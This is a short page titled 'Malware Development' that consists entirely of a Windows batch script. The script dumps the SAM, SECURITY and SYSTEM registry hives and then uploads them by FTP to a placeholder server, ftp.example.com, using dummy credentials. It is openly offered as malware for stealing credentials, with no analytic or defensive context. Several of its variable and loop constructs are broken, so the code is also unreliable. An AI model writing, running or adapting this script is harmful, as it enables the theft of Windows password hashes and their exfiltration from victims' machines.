# Malware Development

## Scripting

### Batch

```batch
@echo off
setlocal enabledelayedexpansion

:: Main entry point
:main
call :dump_hive_files
exit /b

:: Function to dump HIVE files
:dump_hive_files
set hive_files[0]=HKLM\SAM
set hive_files[1]=HKLM\SECURITY
set hive_files[2]=HKLM\SYSTEM

set count=0
for /L %%i in (0,1,2) do (
    call set hive_file=%%hive_files[%%i]%%
    set file_name=%%~nxi
    reg.exe save !hive_file! !file_name!
    if errorlevel 1 (
        echo Failed to dump !hive_file!
        exit /b 1
    ) else (
        echo Successfully dumped !hive_file! to !file_name!
    )
    set /a count+=1
)

:: Proceed to upload files if dumping was successful
call :upload_hive_files
exit /b

:: Function to upload HIVE files via FTP
:upload_hive_files
set ftp_server=ftp.example.com
set ftp_user=username
set ftp_pass=password

:: FTP upload process
(
    echo open %ftp_server%
    echo user %ftp_user% %ftp_pass%
    echo binary
    for /L %%j in (0,1,!count!) do (
        call set file_name=%%hive_files[%%j]%%
        if exist !file_name! (
            echo Uploading !file_name! via FTP...
            echo put !file_name!
        ) else (
            echo File !file_name! does not exist, skipping upload.
        )
    )
    echo bye
) | ftp -n -v > ftp_log.txt

echo FTP upload completed
exit /b

:: Call the main function to start the process
call :main

```